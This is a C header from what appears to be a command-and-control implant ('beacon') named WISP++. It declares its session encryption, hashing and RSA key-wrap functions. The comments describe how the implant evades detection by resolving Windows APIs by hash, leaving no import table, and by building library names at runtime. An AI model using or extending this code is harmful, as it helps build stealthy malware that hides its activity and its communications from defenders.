#pragma once

// WISP++ session crypto over CNG (bcrypt.dll), resolved by hash like the
// rest of the beacon (zero IAT entries).
//
// Sealed blob layout (shared/protocol/crypto.go):
//   IV(16) || AES-256-CTR(plaintext) || HMAC-SHA256(macKey, IV||CT)(32)

#include <windows.h>
#include <bcrypt.h>

#include "WispDefines.h"

#ifndef __WISPBCRYPT_DECLARED
#define __WISPBCRYPT_DECLARED
#define WISP_DECL_API(x) extern decltype(x)* w##x
WISP_DECL_API(BCryptOpenAlgorithmProvider);
WISP_DECL_API(BCryptCloseAlgorithmProvider);
WISP_DECL_API(BCryptGenerateSymmetricKey);
WISP_DECL_API(BCryptDestroyKey);
WISP_DECL_API(BCryptEncrypt);
WISP_DECL_API(BCryptDecrypt);
WISP_DECL_API(BCryptCreateHash);
WISP_DECL_API(BCryptDestroyHash);
WISP_DECL_API(BCryptHashData);
WISP_DECL_API(BCryptFinishHash);
WISP_DECL_API(BCryptGenRandom);
WISP_DECL_API(BCryptSetProperty);
WISP_DECL_API(BCryptImportKeyPair);
WISP_DECL_API(BCryptVerifySignature);
WISP_DECL_API(BCryptGetProperty);
#undef WISP_DECL_API
#endif

// One-time lazy resolution from bcrypt.dll (LoadLibraryA by name built at
// runtime). Returns TRUE on success; later calls are no-ops.
BOOL WispBcryptLoad();

// HMAC-SHA256(key, data) -> 32 bytes in out (caller ensures 32 bytes).
BOOL WispHmacSha256(const BYTE* key, ULONG keyLen, const BYTE* data, ULONG dataLen, BYTE* out);

// SHA256(data) -> 32 bytes.
BOOL WispSha256(const BYTE* data, ULONG dataLen, BYTE* out);

// Streaming SHA-256 (Type3 file hashing without buffering whole files).
typedef struct {
	BCRYPT_ALG_HANDLE  alg;
	BCRYPT_HASH_HANDLE hash;
	PUCHAR             obj;
	ULONG              objLen;
} WispSha256Ctx;
BOOL WispSha256Begin(WispSha256Ctx* c);
BOOL WispSha256Update(WispSha256Ctx* c, const BYTE* data, ULONG len);
BOOL WispSha256End(WispSha256Ctx* c, BYTE* out32);

// AES-256-CTR keystream XOR (in == out allowed).
BOOL WispAesCtrXor(const BYTE* key32, const BYTE* iv16, const BYTE* in, ULONG len, BYTE* out);

// Cryptographically strong random bytes.
BOOL WispRandom(BYTE* out, ULONG len);

// ---- session key material ----

typedef struct {
	BYTE enc[WISP_KEY_SIZE];
	BYTE mac[WISP_MAC_SIZE];
	BYTE id [WISP_KEYID_SIZE];
} WispSessionKey;

// Seal: out = IV || CT || MAC. Caller supplies out buffer; *outLen set on
// success. Returns FALSE when outCap is too small.
BOOL WispSeal(const WispSessionKey* sk, const BYTE* plain, ULONG plainLen, BYTE* out, ULONG outCap, ULONG* outLen);

// Open: verifies MAC then decrypts IV||CT||MAC. Plain buffer allocated by
// caller; *plainLen set. Constant-time MAC compare.
BOOL WispOpen(const WispSessionKey* sk, const BYTE* blob, ULONG blobLen, BYTE* plain, ULONG plainCap, ULONG* plainLen);

// PSKProof = HMAC-SHA256(psk, agentID 0x7c keyID-hex) (crypto.go).
BOOL WispPskProof(const char* psk, const char* agentId, const BYTE* keyId, ULONG keyIdLen, BYTE* out32);

// ---- RSA-OAEP(SHA-256) session-key wrap with a PKIX public key ----

// Parse a PEM "-----BEGIN PUBLIC KEY-----" document into the DER body.
// Returns TRUE and sets der/derLen on success.
BOOL WispPemToDer(const char* pem, BYTE** der, ULONG* derLen);

// RSA-OAEP(SHA256) encrypt blob (the 80-byte session key) with a PKIX
// public key. out receives the ciphertext; *outLen set.
BOOL WispRsaOaepWrap(const BYTE* der, ULONG derLen, const BYTE* plain, ULONG plainLen, BYTE* out, ULONG outCap, ULONG* outLen);
